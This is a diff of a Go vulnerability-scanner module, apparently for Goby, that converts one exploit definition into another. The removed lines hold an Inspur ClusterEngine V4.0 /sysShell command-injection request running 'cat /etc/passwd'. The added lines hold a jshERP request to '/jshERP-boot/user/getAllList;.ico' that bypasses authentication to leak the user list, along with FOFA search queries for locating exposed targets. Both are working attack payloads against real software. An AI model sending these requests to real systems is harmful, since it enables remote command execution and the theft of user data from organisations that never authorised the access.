@@ -6,15 +6,16 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+  "Name": "某ERP系统信息泄露登录后台",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "",
-  "FofaQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "GobyQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "Level": "3",
+  "PostTime": "2023-06-20",
+  "Author": "清晨",
+  "FofaQuery": "\"jshERP-boot\"",
+  "GobyQuery": "\"jshERP-boot\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +30,18 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/sysShell",
-        "follow_redirect": true,
-        "header": {},
+        "method": "GET",
+        "uri": "/jshERP-boot/user/getAllList;.ico",
+        "follow_redirect": false,
+        "header": {
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+          "Accept-Encoding": "gzip, deflate",
+          "Connection": "close",
+          "Upgrade-Insecure-Requests": "1"
+        },
         "data_type": "text",
-        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +58,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
+            "value": "\"userList\"",
             "bz": ""
           }
         ]
@@ -107,7 +114,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+      "Name": "某ERP系统信息泄露登录后台",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +123,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "tide ClusterEngineV4 sysShell rce",
+      "Name": "ERP system information leakage",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -131,8 +138,7 @@ func init() {
     "Service": null,
     "System": null,
     "Hardware": null
-  },
-  "PostTime": "2023-06-20"
+  }
 }`
 
 	ExpManager.AddExploit(NewExploit(
